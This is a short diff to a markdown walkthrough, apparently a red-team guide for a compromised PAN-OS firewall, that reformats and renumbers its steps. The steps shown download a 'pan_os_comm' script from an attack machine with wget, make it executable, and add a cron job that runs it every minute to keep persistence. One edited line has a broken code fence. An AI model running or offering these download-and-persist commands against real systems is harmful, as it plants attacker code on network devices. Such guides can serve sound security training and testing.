@@ -324,9 +324,12 @@ ls
 ```
 
 2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
-   `wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm`
+   ```bash
+      wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm
+   ```
 
-3. Once created, run the following command: `chmod +x pan_os_comm`
+3. Once created, run the following command:
+   ```chmod +x pan_os_comm`
 
 4. To ensure that the file has been successfully downloaded and is executable, run:
 
@@ -334,7 +337,7 @@ ls
 ls -l /usr/local/bin | grep pan_os
 ```
 
-4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
+5. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
 
 ```bash
 (crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm >/dev/null 2>&1") | crontab -
